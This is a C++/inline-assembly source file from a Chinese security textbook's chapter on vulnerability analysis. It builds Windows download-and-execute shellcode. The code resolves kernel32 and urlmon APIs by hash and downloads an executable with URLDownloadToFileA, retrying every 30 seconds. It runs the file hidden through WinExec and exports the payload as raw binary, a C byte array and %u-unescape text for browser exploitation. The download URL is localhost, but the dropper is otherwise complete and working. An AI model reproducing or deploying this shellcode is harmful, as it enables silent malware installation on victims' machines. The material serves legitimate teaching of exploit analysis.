/*-----------------------------------------------------------------------
第14章  漏洞分析技术
《加密与解密（第四版）》
(c)  看雪学院 www.kanxue.com 2000-2018
-----------------------------------------------------------------------*/

// shellcode.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <windows.h>

int main(int argc, char* argv[])
{
	DWORD scStart,scEnd;
	goto getShellcode;	
	__asm
	{
sc_start:
		//shellcode在这里编写
		
		/*
		*	shellcode 基本模块
		*	第一步：查找Kernel32基址	
		*
		*/
		xor		ecx, ecx
		mov		ecx, dword ptr fs:[30h]
		mov		ecx, dword ptr [ecx+0Ch]
		mov		esi, dword ptr [ecx+1Ch]
sc_goonKernel:  
		mov		eax, dword ptr [esi+8]
        mov		ebx, dword ptr [esi+20h]            
        mov		esi, dword ptr [esi]
        cmp		dword ptr [ebx+0Ch], 320033h;判断名称中字符32的unicode
        jnz		sc_goonKernel

		mov		ebx, eax  ;获取kernel32地址 
		/*
		*	shellcode 基本模块
		*	第二步：查找API地址	
		*
		*/
		jmp		DataArea
backToMain:
		pop     ebp			//捆绑数据地址
		

		//获取Kernel32中API的地址
		//ebx赋值dll基址
		//edi赋值hash值地址
		//ecx赋值API数量
		mov     edi, ebp
		mov		ecx, 07h
FindApi_loop:		
		call    FindApi //循环查找API地址
		loop	FindApi_loop

		//调用LoadLibraryA加载urlmon
		push	6e6fh
		push	6d6c7275h
		mov		eax, esp
		push	eax
		call	dword ptr[ebp] //Kernel32.LoadLibrary
		mov		ebx, eax
		pop     eax
		pop     eax	//平衡栈

		//获取urlmon中API的地址		
		call    FindApi


		/*
		*	shellcode 功能模块
		*	第一步：下载路径设置	
		*
		*/
		//申请空间存放文件路径 
		push    40h
		push    1000h
		push    100h			//申请空间大小
		push    0
		call    dword ptr [ebp+04h]	//	kernel32.VirtualAlloc
		mov     dword ptr [ebp+20h], eax
		//获取临时文件夹路径
		push	eax
		push	100h
		call	dword ptr [ebp+0ch]//Kernel32.GetTempPathA
		//设置临时exe文件路径
		//%TEMP%\test.exe
		mov		ecx, dword ptr[ebp+20h]
		add		ecx, eax
		mov		dword ptr[ecx], 74736574h
		mov		dword ptr[ecx+4], 6578652eh
		mov		dword ptr[ecx+8], 0
		/*
		*	shellcode 功能模块
		*	第二步：下载文件URLDownloadToFile	
		*
		*/
try_Download:
		push	0
		push	0
		push	dword ptr[ebp+20h]//exe路径
		lea		eax, dword ptr[ebp+24h]//URL
		push	eax
		push	0
		call	dword ptr[ebp+1ch]//urlmon.URLDowanloadToFileA
		test	eax, eax
		jz		Download_OK
		push	30000//休眠30秒重试
		call	dword ptr[ebp+14h]//Kernel32.Sleep
		jmp		try_Download
		/*
		*	shellcode 功能模块
		*	第三步：运行文件WinExec	
		*
		*/
Download_OK:
		push	SW_HIDE
		push	dword ptr[ebp+20h]
		call	dword ptr[ebp+10h]//Kernel32.WinExec
		
		push    08000h
		push    00h
		push    dword ptr [ebp+20h]
		call    dword ptr [ebp+08h]//kernel32.VirtualFree

		push	0
		push	0FFFFFFFFh
		call	dword ptr[ebp+18h]//Kernel32.TerminateProcess
		/*
		*	shellcode 基本模块
		*	查找API地址	
		*
		*/
FindApi:
		push    ecx
		push    ebp
		mov     esi, dword ptr [ebx+3Ch]	// e_lfanew
		mov     esi, dword ptr [esi+ebx+78h]// EATAddr
		add     esi, ebx
		push    esi
		mov     esi, dword ptr [esi+20h]    //AddressOfNames
		add     esi, ebx
		xor     ecx, ecx
		dec     ecx
			
Find_Loop:		
		inc     ecx
		lods    dword ptr [esi]
		add     eax, ebx
		xor     ebp, ebp
		//计算hash值	
Hash_Loop:
		movsx   edx, byte ptr [eax]
		cmp     dl, dh
		je      hash_OK
		ror     ebp, 7
		add     ebp, edx
		inc     eax
		jmp     Hash_Loop
			
hash_OK:
		//判断hash值是否相等
		cmp     ebp, dword ptr [edi]		
		jnz     Find_Loop

		pop     esi
		mov     ebp, dword ptr [esi+24h]	//Ordinal Table
		add     ebp, ebx
		mov     cx, word ptr [ebp+ecx*2]
		mov     ebp, dword ptr [esi+1Ch]	//Address Table
		add     ebp, ebx
		mov     eax, dword ptr [ebp+ecx*4]
		add     eax, ebx
		stos    dword ptr es:[edi]
		pop     ebp
		pop     ecx
		retn
DataArea:
		call	backToMain

sc_end:
	}
getShellcode:
	_asm
	{		
		mov		scStart, offset sc_start
		mov		scEnd, offset sc_end
	}
	DWORD scLen = scEnd - scStart;
	char Datas[] = 
		"\x32\x74\x91\x0c"		//ebp,Kernel32.LoadLibraryA
		"\x67\x59\xde\x1e"		//ebp+4,Kernel32.VirtualAlloc
		"\x05\xaa\x44\x61"		//ebp+8,Kernel32.VirtualFree
		"\x39\xe2\x7D\x83"		//ebp+0ch,Kernel32.GetTempPathA
		"\x51\x2f\xa2\x01"		//ebp+10h,Kernel32.WinExec
		"\xa0\x65\x97\xcb"		//ebp+14h,Kernel32.Sleep
		"\x8f\xf2\x18\x61"		//ebp+18h,Kernel32.TerminateProcess 
		"\x80\xd6\xaf\x9a"		//ebp+1ch,Urlmon.URLDownloadToFileA
		"\x00\x00\x00\x00"		//ebp+20h,变量空间
		"http://127.0.0.1/calc.exe"//ebp+24h,设置下载地址
		"\x00\x00";

	int newscBuff_length = scLen+sizeof(Datas);
	unsigned char *newscBuff = new unsigned char[newscBuff_length];

	memset(newscBuff,0x00,newscBuff_length);
	memcpy(newscBuff,(unsigned char *)scStart,scLen);
	memcpy((unsigned char *)(newscBuff+scLen),Datas,sizeof(Datas));
	int i=0;
	unsigned char xxx;
	for (i = 0;i < newscBuff_length; i++)
	{
		xxx = ((unsigned char *)newscBuff)[i];
		xxx = xxx ^ 0x00;
		newscBuff[i] = xxx;
	}
	
	FILE *fp = fopen("./shellcode_bin.bin","wb+");
	fwrite(newscBuff,newscBuff_length,1,fp);
	fclose(fp);
	
	FILE *fp_cpp = fopen("./shellcode_cpp.cpp","wb+");
	fwrite("unsigned char sc[] = {",22,1,fp_cpp);
	for (i=0;i<newscBuff_length;i++)
	{
		if (i%16==0)
		{
			fwrite("\r\n",2,1,fp_cpp);
		}
		fprintf(fp_cpp,"0x%02x,",newscBuff[i]);
	}
	fwrite("};",2,1,fp_cpp);
	fclose(fp_cpp);
	
	FILE *fp_unicode = fopen("./shellcode_unescape.txt","wb+");
	for(i = 0; i < newscBuff_length; i += 2)
	{
		fprintf(fp_unicode,"%%u%02x%02x",newscBuff[i+1],newscBuff[i]);
	}
	fclose(fp_unicode);
	printf("Hello World!\n");
	return 0;
}

